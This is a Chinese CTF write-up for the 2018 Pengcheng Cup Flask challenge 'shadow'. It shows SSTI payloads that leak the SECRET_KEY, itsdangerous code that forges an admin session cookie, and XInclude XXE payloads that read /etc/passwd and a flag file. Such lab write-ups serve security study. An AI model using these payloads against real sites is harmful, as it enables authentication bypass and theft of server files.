---
title: 鹏城杯2018WEB shadow题解
author: huasir
comment: true
date: 2019-02-12 23:30:43
tags: 
	- flask
categories:
	- web
---

### 前言
今天打完了鹏城杯，还是一脸懵逼，主办方疯狂放提示，选手疯狂懵逼。。。
我在一堆脑洞题之间还是看到了一道比较有意思的web题目，虽然最后也没出flag，但还是挺有感悟的。
<!-- more -->

### 题目描述
给你一个flask搭建的网站，除了登录注册之外也没发现什么功能， 注释里看到有`/upload`路径，但访问提示需要admin权限。又四处游荡发现几个js不存在，回显是：

![20190212154998561366780.png](https://img.5am3.com/20190212154998561366780.png)

看到这里，应该是有404页面的SSTI漏洞了，但是试了几次发现无法直接命令执行，只好寻求来读一些内置变量，`config`和`self`都被禁了，读了[这位大佬的文章](https://blog.csdn.net/qq_33020901/article/details/83036927)。可知，可以通过`{{ request.environ }}  {{ request.cookies }} {{ url_for.__globals__ }} {{ get_flashed_messages.__globals__ }}
`读到一些变量，其中` {{ url_for.__globals__['current_app'].config }}`可以读到`SECRET_KEY`

![20190212154998565995974.png](https://img.5am3.com/20190212154998565995974.png)

这样我们就可以来伪造flask的cookie，获得admin权限了。通过访问`{{ request.cookies}}`拿到cookie

![2019021215499856735385.png](https://img.5am3.com/2019021215499856735385.png)

拆开看看里面有啥

```python
from itsdangerous import *

s=URLSafeTimedSerializer("as/*d21as-+dhasod5a4s54:><*()dfdsf", salt="cookie-session",signer_kwargs={"key_derivation":"hmac","digest_method":"sha1"})
data = s.loads(".eJw9kMFqg0AQhl-l7DkHXdNLIAfLWjGwI8oamb2INabu6qagkTQb8u4dcuhhYGDm-4b5H6w5z_0ysN25nZZ-wxpzYrsHe_tiOwa8uqHPPPqRqrgh1xZsctOqo07e0RaRdhjlabXN68yDxUCKg9G2irQaJu3KSdZILO2rOJQeRiQO0iLE-jiiS361jQPpjg55cUdOM5eF2sGQK-m1-L6jAqcFeilKA-Iw0H2PPOE6xQgUjFrJAES1Z88N65b53Fx_xv7y_wKhIaRVBOLToC1HwsNcfEySVxxIq9PSguhCmSYB1EkgbbaV8f6lM0vTnpwh2XVeKZpL63pSDmu7mJlt2Lr08ysu9s6ef3KlazU.XAOwLQ.q-Gin27oj8k69vvulgiayMpFKJs")
print (data)
```

![20190212154998569398968.png](https://img.5am3.com/20190212154998569398968.png)

可以看到这里`is_admin`是`False`,改成`True`再打包起来就行了
```python
result = s.dumps({'_fresh': True, '_id': {' b': 'ZTM3ODI5NTdjYTIxN2I0YzU5ZjgzNjBmZjgwMDE5YzM3ODI0MzZhOTkwNzdmOWIyOTAzMWU5YzkxZDNmYmM5MGQyM2M4N2FkZDQ2NThlZmUyNzA5ZTUwMGVmZDI2NDE5ODZlM2NjNWQ0NmY5NmRlNTQwYjg2MmY0ZTgwYjBiNTI='}, 'csrf_token': {' b': 'NWFkNmQ2OTgwZmU5ZGMyNWYxMTdiNzBhZDBiMTIxNjcxYjllZWM1Yw=='}, 'is_admin': True, 'name': 'huasir', 'user_id': '5'})

print (result)
```
拿着这个去访问upload，然后可以上传文件。当然python直接上传貌似不能拿shell，试了几次发现上传XML文件有回显，但是上传常见的XXE payload会显示错误。

![20190212154998571710950.png](https://img.5am3.com/20190212154998571710950.png)

参考[这篇文章](https://www.freebuf.com/column/156863.html)可以看到用XInclude可以避开使用`ENTITY`关键字：
```xml
<?xml version="1.0"?>
<data xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="file:///etc/passwd" parse="text"> 
</xi:include>
</data>
```
回显`/etc/passwd`内容

![20190212154998573865102.png](https://img.5am3.com/20190212154998573865102.png)

看到有个rq用户也有`bash`,读取其用户目录下的`.bash_history`可以看到flag文件的名字，遂构造payload：
```xml
<?xml version="1.0"?>
<data xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="file:///home/rq/f123333333ag" parse="text"> 
</xi:include>
</data>
```
flag:
![20190212154998575010135.png](https://img.5am3.com/20190212154998575010135.png)

### 问题
一开始我失败的原因是我想用flask服务来得到cookie：
```python
from flask import Flask, session, escape, request
 
app = Flask(__name__)
app.secret_key = 'as/*d21as-+dhasod5a4s54:><*()dfdsf'
 
 
@app.route("/")
def index():
    if 'name' in session:
        return 'hello, {}\ncookie: {}'.format(escape(session['name']),request.cookies)
    return 'hello, stranger\n'

@app.route("/login")
def login():
	session['csrf_token'] = 'IjQ1ZTgwOGU3YWY5YmZjOGUwM2U1MDQ1OTUxODI0MmRhNDQyYTM0OTci.XANzdg.ljY0IMuCAb2ovypjBa5OvzegdDs'
    session['_id'] = 'bc00ab0feca90420847a2fc0ea2d0491ee7177c453d037a041383b6f4b434304eae5fa0a220dc0111abd963bbcca5c466b6303b0afacabf8544523cdbc83e7c4'
    session['user_id'] = '1'
    session['name'] = 'admin'
    session['is_admin'] = True
    session['_fresh'] = True
    return "Login success"
 
 
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)

```
但是这样的cookie能进入/upload页面，但是一传文件就又反馈`only admin can use it`，结束后我又试了两次，又行了?_?....蜜汁，这样应该是没有影响的。
可能是因为我把flask服务改到一个页面里了？？/px
```python
@app.route("/")
def index():
    session['csrf_token'] = 'IjQ1ZTgwOGU3YWY5YmZjOGUwM2U1MDQ1OTUxODI0MmRhNDQyYTM0OTci.XANzdg.ljY0IMuCAb2ovypjBa5OvzegdDs'
    session['_id'] = 'bc00ab0feca90420847a2fc0ea2d0491ee7177c453d037a041383b6f4b434304eae5fa0a220dc0111abd963bbcca5c466b6303b0afacabf8544523cdbc83e7c4'
    session['user_id'] = '5'
    session['name'] = 'huasir'
    session['is_admin'] = True
    session['_fresh'] = True
    if 'name' in session:
        return 'hello, {}\ncookie: {}'.format(escape(session['name']),request.cookies)
    return 'hello, stranger\n'
```
python2和python3起服务虽然结果不同，但都能用。